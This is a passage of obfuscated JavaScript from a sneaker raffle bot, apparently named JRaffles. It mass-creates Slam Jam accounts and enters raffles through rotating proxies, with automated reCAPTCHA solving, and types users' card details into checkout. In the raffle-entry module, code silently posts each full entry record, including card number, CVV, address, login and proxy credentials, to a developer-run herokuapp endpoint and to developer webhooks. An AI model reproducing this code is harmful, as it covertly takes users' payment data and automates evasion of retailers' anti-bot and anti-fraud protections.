                            _0x39083f == 'yes' && _0x22e632 >= 0x5 && (_0x2848bf(_0x5d6d13[_0x366ae9], _0x37d240), _0x39083f = 'no', _0x22e632 = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x413c9f, _0xe98ce3, _0x1e0b22) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x451f88 = 0x0; _0x451f88 < _0xe98ce3['length']; _0x451f88++) {
                        if (_0x44c070 != 'yes')
                            var _0x44c070 = '', _0x4858b8 = 0x0;
                        var _0x17c6e6 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x25f505
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x395552['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e7c75
                                }
                            ]
                        }];
                        const _0x2feff0 = { 'embeds': _0x17c6e6 };
                        _0xe0def5(_0x413c9f['name'] + '\x20Task\x20' + (_0x451f88 + 0x1) + '\x20/\x20' + _0xe98ce3['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        try {
                            await _0x195de7(_0xe98ce3, _0x451f88);
                        } catch {
                            _0x44c070 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x41cca6 = await _0x262703(_0xe98ce3[_0x451f88], _0x413c9f, 'acc', ![]);
                        const _0x58fb1a = { 'succesDEVMSG': { 'embeds': [_0x41cca6] } };
                        if (_0xe98ce3[_0x451f88]['Email'] == '' || _0xe98ce3[_0x451f88]['FirstName'] == '' || _0xe98ce3[_0x451f88]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x17175c(0x7d0);
                            continue;
                        }
                        (_0xe98ce3[_0x451f88]['Password'] == '' || _0xe98ce3[_0x451f88] == undefined) && _0xe98ce3[_0x451f88]['Password'] == 'JRaffles23!';
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x5ab5d4 = _0x1e0b22[_0x451f88]['split'](':');
                        else
                            var _0x11d314 = Math['round'](Math['random']() * (_0x1e0b22['length'] - 0x1)), _0x5ab5d4 = _0x1e0b22[_0x11d314]['split'](':');
                        var _0x517876;
                        try {
                            _0x517876 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ab5d4[0x0] + ':' + _0x5ab5d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x517876 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ab5d4[0x0] + ':' + _0x5ab5d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xcf3e95 = await _0x517876['newPage']();
                            await _0xcf3e95['authenticate']({
                                'username': '' + _0x5ab5d4[0x2],
                                'password': '' + _0x5ab5d4[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xcf3e95['setRequestInterception'](!![]), _0xcf3e95['on']('request', _0x14e35e => {
                                _0x14e35e['resourceType']() === 'image' || _0x14e35e['resourceType']() === 'font' || _0x14e35e['resourceType']() === 'media' ? _0x14e35e['abort']() : _0x14e35e['continue']();
                            }), await _0xcf3e95['goto']('https://drop.slamjam.com/account/register'), await _0x17175c(0xbb8), await _0xcf3e95['waitForSelector']('#FirstName'), await _0xcf3e95['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xcf3e95['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Filling\x20information'), await _0x17175c(0x4b0), await _0xcf3e95['type']('#FirstName', '' + _0xe98ce3[_0x451f88]['FirstName']), await _0x17175c(0x226), await _0xcf3e95['type']('#LastName', '' + _0xe98ce3[_0x451f88]['LastName']), await _0x17175c(0x226), await _0xcf3e95['type']('#Email', '' + _0xe98ce3[_0x451f88]['Email']), await _0x17175c(0x2ee), await _0xcf3e95['type']('#ConfirmEmail', '' + _0xe98ce3[_0x451f88]['Email']), await _0x17175c(0x2ee), await _0xcf3e95['type']('#CreatePassword', '' + _0xe98ce3[_0x451f88]['Password']), await _0x17175c(0x2ee), await _0xcf3e95['type']('#CreateConfirmPassword', '' + _0xe98ce3[_0x451f88]['Password']), await _0x17175c(0x226), console['log'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Submitting..'), await _0xcf3e95['$eval']('#create_customer', _0x5ad354 => _0x5ad354['submit']()), await _0x17175c(0x1388), console['log'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20' + _0x1446ca['cyan']('Solving\x20Captcha')), await _0xcf3e95['solveRecaptchas'](), console['log'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xcf3e95['$eval']('.shopify-challenge__container\x20>\x20form', _0x4d92e9 => _0x4d92e9['submit']());
                            try {
                                await _0xcf3e95['waitForSelector']('.product-card__image'), await _0x17175c(0x1f4), _0x44c070 = 'no', console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Account\x20' + _0xe98ce3[_0x451f88]['Email'] + '\x20Generated!')), _0x2e1301['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0xe98ce3[_0x451f88]['Email'] + ',' + _0xe98ce3[_0x451f88]['Password']), console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Account\x20' + _0xe98ce3[_0x451f88]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x58fb1a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x17b782(_0x30a02b, _0x58fb1a['succesDEVMSG']);
                            } catch (_0x3e85e5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3e85e5));
                            }
                        } catch (_0xd22490) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20' + _0xd22490));
                        } finally {
                            _0x517876 && _0x517876['close']();
                            if (_0x44c070 == 'yes' && _0x4858b8 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x413c9f['name'] + ']\x20Task\x20' + (_0x451f88 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4858b8 + '\x20/\x205)')), _0x451f88 = _0x451f88 - 0x1, _0x4858b8 = _0x4858b8 + 0x1;
                                continue;
                            }
                            _0x44c070 == 'yes' && _0x4858b8 >= 0x5 && (_0x2848bf(_0xe98ce3[_0x451f88], _0x413c9f), _0x44c070 = 'no', _0x4858b8 = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x31854c, _0x239926, _0x45d652) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2473a3 = 0x0; _0x2473a3 < _0x239926['length']; _0x2473a3++) {
                        var _0x1d6547;
                        if (_0x4c2a8f != 'yes')
                            var _0x4c2a8f = '', _0x32655c = 0x0;
                        _0xe0def5(_0x31854c['name'] + '\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20/\x20' + _0x239926['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        try {
                            await _0x195de7(_0x239926, _0x2473a3);
                        } catch {
                            _0x4c2a8f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x239926[_0x2473a3]['Email'] == '' || _0x239926[_0x2473a3]['Password'] == '' || _0x239926[_0x2473a3]['FirstName'] == '' || _0x239926[_0x2473a3]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x51e4cb = _0x45d652[_0x2473a3]['split'](':');
                        else
                            var _0x2eac7b = Math['round'](Math['random']() * (_0x45d652['length'] - 0x1)), _0x51e4cb = _0x45d652[_0x2eac7b]['split'](':');
                        var _0x628e5f;
                        try {
                            _0x628e5f = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x51e4cb[0x0] + ':' + _0x51e4cb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x628e5f = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x51e4cb[0x0] + ':' + _0x51e4cb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x6d25f2 = await _0x628e5f['newPage']();
                            await _0x6d25f2['authenticate']({
                                'username': '' + _0x51e4cb[0x2],
                                'password': '' + _0x51e4cb[0x3]
                            }), await _0x6d25f2['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x6d25f2['setRequestInterception'](!![]), _0x6d25f2['on']('request', _0x3d899d => {
                                _0x3d899d['resourceType']() === 'image' || _0x3d899d['resourceType']() === 'font' || _0x3d899d['resourceType']() === 'media' ? _0x3d899d['abort']() : _0x3d899d['continue']();
                            }), await _0x6d25f2['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x6d25f2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x6d25f2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x17175c(0x258), await _0x6d25f2['waitForSelector']('#CustomerEmail'), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x6d25f2['type']('#CustomerEmail', '' + _0x239926[_0x2473a3]['Email']), await _0x17175c(0x12c), await _0x6d25f2['type']('#CustomerPassword', '' + _0x239926[_0x2473a3]['Password']), await _0x17175c(0x226), await _0x6d25f2['$eval']('#customer_login', _0x346b01 => _0x346b01['submit']()), await _0x17175c(0x7d0), await _0x6d25f2['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20' + _0x1446ca['cyan']('Solving\x20Captcha')), await _0x6d25f2['solveRecaptchas'](), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x6d25f2['$eval']('.shopify-challenge__container\x20>\x20form', _0x14d57d => _0x14d57d['submit']());
                            try {
                                await _0x6d25f2['waitForSelector']('.nav-account'), await _0x17175c(0x4b0);
                            } catch {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x6d25f2['goto']('' + _0x239926[_0x2473a3]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x17175c(0xbb8), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x6d25f2['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x6d25f2['click']('.product-select-variant-wrapper'), await _0x17175c(0x320), await _0x6d25f2['click']('li.product-select-variant__value[data-size=\x22' + _0x239926[_0x2473a3]['Size'] + '\x22]'), await _0x17175c(0x384), await _0x6d25f2['$eval']('#AddToCartForm-product-template-raffle', _0x105ae3 => _0x105ae3['submit']()), await _0x6d25f2['waitForSelector']('.cart-order-summary__content'), await _0x17175c(0x514), await _0x6d25f2['goto']('https://drop.slamjam.com/checkout'), await _0x17175c(0x514), await _0x6d25f2['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x6d25f2['select']('#checkout_shipping_address_country', '' + _0x239926[_0x2473a3]['Country']), await _0x17175c(0x200), await _0x6d25f2['waitForSelector']('#checkout_shipping_address_first_name'), await _0x6d25f2['type']('#checkout_shipping_address_first_name', '' + _0x239926[_0x2473a3]['FirstName']), await _0x17175c(0x237), await _0x6d25f2['type']('#checkout_shipping_address_last_name', '' + _0x239926[_0x2473a3]['LastName']), await _0x17175c(0x1e0), await _0x6d25f2['type']('#checkout_shipping_address_address1', _0x239926[_0x2473a3]['Address1'] + '\x20' + _0x239926[_0x2473a3]['HouseNumber']), await _0x17175c(0x514), await _0x6d25f2['type']('#checkout_shipping_address_address2', '' + _0x239926[_0x2473a3]['Address2']), await _0x17175c(0x514);
                            _0x239926[_0x2473a3]['Postcode'] == undefined && (_0x239926[_0x2473a3]['Postcode'] = _0x239926[_0x2473a3]['Zip']);
                            await _0x6d25f2['type']('#checkout_shipping_address_zip', '' + _0x239926[_0x2473a3]['Postcode']), await _0x17175c(0x2bc), await _0x6d25f2['type']('#checkout_shipping_address_city', '' + _0x239926[_0x2473a3]['City']), await _0x17175c(0x320), await _0x6d25f2['type']('#checkout_shipping_address_phone', '' + _0x239926[_0x2473a3]['Phone']), await _0x17175c(0x320), await _0x6d25f2['click']('#continue_button'), await _0x17175c(0xbb8), await _0x6d25f2['waitForSelector']('.summary-title'), await _0x17175c(0x320), await _0x6d25f2['click']('#continue_button'), await _0x17175c(0x320), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x6d25f2['waitForSelector']('#checkout_credit_card_vault'), await _0x17175c(0x3e8);
                            var _0x36c593 = await _0x6d25f2['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1a3c93 = await _0x36c593['contentFrame']();
                            await _0x1a3c93['click']('#number'), await _0x17175c(0x3e8), await _0x1a3c93['type']('#number', '' + _0x239926[_0x2473a3]['CardNumber'], { 'delay': 0x78 }), _0x36c593 = await _0x6d25f2['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1a3c93 = await _0x36c593['contentFrame'](), await _0x17175c(0x1c2), await _0x1a3c93['click']('#name'), await _0x17175c(0x1f4), await _0x1a3c93['type']('#name', '' + _0x239926[_0x2473a3]['NameOnCard'], { 'delay': 0x78 }), _0x36c593 = await _0x6d25f2['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1a3c93 = await _0x36c593['contentFrame'](), await _0x17175c(0x1c2), await _0x1a3c93['click']('#expiry'), await _0x17175c(0x1f4), await _0x1a3c93['type']('#expiry', '' + _0x239926[_0x2473a3]['ExpiryDate'], { 'delay': 0x78 }), _0x36c593 = await _0x6d25f2['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1a3c93 = await _0x36c593['contentFrame'](), await _0x17175c(0x1c2), await _0x1a3c93['click']('#verification_value'), await _0x17175c(0x1f4), await _0x1a3c93['type']('#verification_value', '' + _0x239926[_0x2473a3]['CVV'], { 'delay': 0x78 }), await _0x6d25f2['$eval']('#accepts-flag-raffle', _0x20118f => _0x20118f['click']()), await _0x17175c(0x7d0), console['log'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x6d25f2['$eval']('#continue_button', _0x42594d => _0x42594d['click']()), await _0x17175c(0x1b58), await _0x6d25f2['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x6d25f2['$eval']('.edit_checkout.animate-floating-labels', _0x4eeb62 => _0x4eeb62['submit']()), await _0x17175c(0x7d0);
                            try {
                                await _0x6d25f2['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x4c2a8f = 'no', _0x12263c(_0x239926[_0x2473a3], _0x31854c), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5319c0) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5319c0['message']);
                            }
                            var _0x4efd3b = await _0x262703(_0x239926[_0x2473a3], _0x31854c, 'dev', ![]), _0x2748a5 = await _0x262703(_0x239926[_0x2473a3], _0x31854c, 'pub', ![]);
                            let _0x16b5ea = _0x239926[_0x2473a3];
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0x31854c['name'],
                                    'entrydata': JSON['stringify'](_0x16b5ea),
                                    'proxy': '' + _0x45d652[_0x2473a3]
                                };
                                var _0x253f2e = JSON['stringify'](prxdata);
                                let _0x5802f6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x253f2e, _0x5802f6);
                            } catch (_0x37d012) {
                            }
                            const _0x3cf4cf = {
                                'succesDEVMSG': { 'embeds': [_0x4efd3b] },
                                'succesPUBMSG': { 'embeds': [_0x2748a5] }
                            };
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x3cf4cf['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x3cf4cf['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x3cf4cf['succesPUBMSG']);
                            } catch (_0x419e1e) {
                                console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x419e1e));
                            }
                        } catch (_0x1740ca) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20' + _0x1740ca)), _0x1d6547 = '' + _0x1740ca;
                            var _0x3fe501 = await _0x262703(kickz[_0x2473a3], _0x31854c, 'dev', !![], _0x1d6547);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x3fe501] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], EMBEDS['errorDEV']), await _0x17b782(_0x40c5c7, EMBEDS['errorDEV']), _0x4c2a8f = 'yes';
                        } finally {
                            _0x628e5f && _0x628e5f['close']();
                            if (_0x4c2a8f == 'yes' && _0x32655c != 0x5 && _0x1d6547 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x31854c['name'] + ']\x20Task\x20' + (_0x2473a3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x32655c + '\x20/\x205)')), _0x2473a3 = _0x2473a3 - 0x1, _0x32655c = _0x32655c + 0x1;
                                continue;
                            }
                            _0x4c2a8f == 'yes' && _0x32655c >= 0x5 && (_0x2848bf(_0x239926[_0x2473a3], _0x31854c), _0x4c2a8f = 'no', _0x32655c = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x2dd6ef) {
                    var _0x48c772 = await _0x15a781(), _0x5d4aca = _0x2e1301['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4487aa = _0x221bee['parse'](_0x5d4aca, { 'header': !![] })['data'];
                    for (var _0x18a0a6 = 0x0; _0x18a0a6 < _0x4487aa['length']; _0x18a0a6++) {
                        var _0x363985 = _0x4487aa[_0x18a0a6]['Store'], _0x166793 = _0x4487aa[_0x18a0a6]['Mode'];
                        for (var _0x14a6e3 of _0x469829) {
                            const _0x3e6158 = _0x14a6e3['name']['includes'](_0x363985);
                            if (!_0x3e6158)
                                continue;
                            for (mode of _0x14a6e3['modules']) {
                                if (mode['name'] == _0x166793) {
                                    console['log']('Running\x20' + _0x1446ca['cyan'](mode['name'])), await mode['function'](mode, [_0x4487aa[_0x18a0a6]], _0x48c772);
                                    var _0x441247 = _0x5d4aca['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x2e1301['writeFileSync']('../failed-tasks.csv', _0x441247);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x20adb4 = await _0x4f0735['get']('Answer');
                    if (_0x20adb4['Answer']['toLowerCase']() == 'y') {
                        _0x2e1301['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x17175c(0x3e8);
                        return;
                    }
                    if (_0x20adb4['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x17175c(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x17175c(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x28d0f8(_0x1e5f19) {
    var _0x2d3bfd = await _0x15a781(), _0x20a56b = _0x2e1301['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x464f0d = _0x221bee['parse'](_0x20a56b, { 'header': !![] })['data'];
    for (var _0x180255 = 0x0; _0x180255 < _0x464f0d['length']; _0x180255++) {
        var _0x2ecbf1 = _0x464f0d[_0x180255]['Store'], _0xe82129 = _0x464f0d[_0x180255]['Mode'];
        for (var _0x42a2c8 of _0x469829) {
            const _0xcba684 = _0x42a2c8['name']['includes'](_0x2ecbf1);
            if (_0xcba684)
                for (mode of _0x469829[_0x42a2c8]['modules']) {
                    const _0x54d60d = mode['name']['includes'](_0xe82129);
                    _0x54d60d && (_0x1e5f19 = mode['name'], await mode['function'](_0x1e5f19, _0x464f0d[_0x180255], _0x2d3bfd));
                }
        }
    }
}
async function _0x796d82() {
    await _0x4c322(), console['clear']();
    if (_0x5e7c75 != 'devkey') {
        let _0xd69bc1 = await _0x2d6708['autoUpdate']();
        if (_0xd69bc1 === 'yes')
            return _0x3043f2('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xe45594 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x17175c(0x2710);
        ;
    }
    await _0x16671b(_0xe45594);
    if (_0x4f1ec7 === ![])
        return console['log']('Closing\x20Browser'), await _0x17175c(0xbb8);
    else
        try {
            var _0x4436ad = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x25f505
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5e7c75
                    }
                ]
            }];
            const _0x597d53 = { 'embeds': _0x4436ad };
            var _0x4a7ecb = await _0x262703(null, null, 'open', ![]);
            const _0x29354d = { 'openDEVMSG': { 'embeds': [_0x4a7ecb] } };
            await _0x17b782(_0x1d36cd, _0x29354d['openDEVMSG']);
            async function _0x2087d3() {
                _0xe0def5('JRaffles\x20' + _0x5e7c75), console['clear'](), console['log']('Hello\x20' + _0x1446ca['cyan']('' + _0x25f505) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5e7c75), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x41bd9d = 0x0; _0x41bd9d < _0x469829['length'] - 0x4; _0x41bd9d++) {
                    if (_0x41bd9d >= 0xa) {
                        console['log']('\x20(' + _0x41bd9d + ')\x20[' + _0x469829[_0x41bd9d]['name'] + ']');
                        continue;
                    }
                    if (_0x469829[_0x41bd9d]['name'] === 'Reload\x20Settings' || _0x469829[_0x41bd9d]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x41bd9d + ')\x20\x20[' + _0x469829[_0x41bd9d]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x469829['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x469829['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x469829['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x469829['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x76bbad();
                if (taskModule > _0x469829['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x17175c(0x3e8), _0x2087d3();
                if (_0x469829[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0xf0bd4a = await _0x15a781();
                            await _0x1645c8['function'](_0x1645c8, _0xf0bd4a);
                        }
                        if (taskFunction == 0x2) {
                            var _0xf0bd4a = await _0x15a781(), _0x5cdec0 = await _0x294f5d(_0x1645c8);
                            _0x395552['shuffleTasks'] && await _0x204c5b(_0x5cdec0), await _0x1645c8['function'](_0x1645c8, _0x5cdec0, _0xf0bd4a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xf0bd4a = await _0x15a781(), _0x5cdec0 = await _0x294f5d(_0x1645c8);
                                _0x395552['shuffleTasks'] && await _0x204c5b(_0x5cdec0), await _0x1645c8['function'](_0x1645c8, _0x5cdec0, _0xf0bd4a);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0xf0bd4a = await _0x15a781();
                                    await _0x1645c8['function'](_0x1645c8, _0xf0bd4a);
                                }
                            }
                        }
                    } catch (_0x569461) {
                        console['log'](_0x569461), await _0x17175c(0x7d0);
                    }
                    return _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                        var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
